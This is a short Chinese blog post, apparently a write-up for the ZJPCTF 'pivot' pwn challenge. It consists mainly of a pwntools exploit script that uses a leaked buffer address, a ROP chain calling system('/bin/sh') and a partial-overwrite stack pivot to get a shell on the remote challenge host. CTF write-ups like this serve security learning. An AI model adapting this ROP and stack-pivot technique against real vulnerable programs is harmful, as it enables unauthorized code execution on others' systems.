---
title: "pivot"
published: 2026-06-15T00:00:00+08:00
description: "记录 ZJPCTF pivot 题目的利用脚本。"
image: ""
tags: ["ZJPCTF", "Pwn", "pivot"]
category: "ZJPCTF"
categoryPath: ["ZJPCTF"]
series: "ZJPCTF"
draft: false
lang: "zh_CN"
---

附件：[`pivot-wp.docx`](/attachments/ZJPCTF/pivot/pivot-wp.docx)

![shot 1](/attachments/ZJPCTF/pivot/01-shot-1.png)
![shot 2](/attachments/ZJPCTF/pivot/02-shot-2.png)
![shot 3](/attachments/ZJPCTF/pivot/03-shot-3.png)
![shot 4](/attachments/ZJPCTF/pivot/04-shot-4.png)

exp：

```python
from pwn import *

context(os="linux",arch="amd64",log_level="debug")
elf=ELF("./pwn",checksec=False)
pop_rdi=0x4011F1
ret=0x4011F6
system=elf.plt["system"]

io=remote("nc1.ctfplus.cn",23968)
io.recvuntil(b"Desk stamp: ")
io.recvline()
io.recvuntil(b"Claim check: ")
buf=int(io.recvline().strip(),16)
low=buf&0xff
if low<=0x8f:
    off=0x48
elif low>=0xb8:
    off=0x100-low

payload=flat(
    b"/bin/sh\x00".ljust(off,b"A"),
    0,
    pop_rdi,
    buf,
    ret,
    system,
    word_size=64,
).ljust(0x70,b"B")

io.send(payload)
io.recvuntil(b"night clerk:\n")
io.send(b"D"*0x20+p8((buf+off)&0xff))
io.interactive()
```
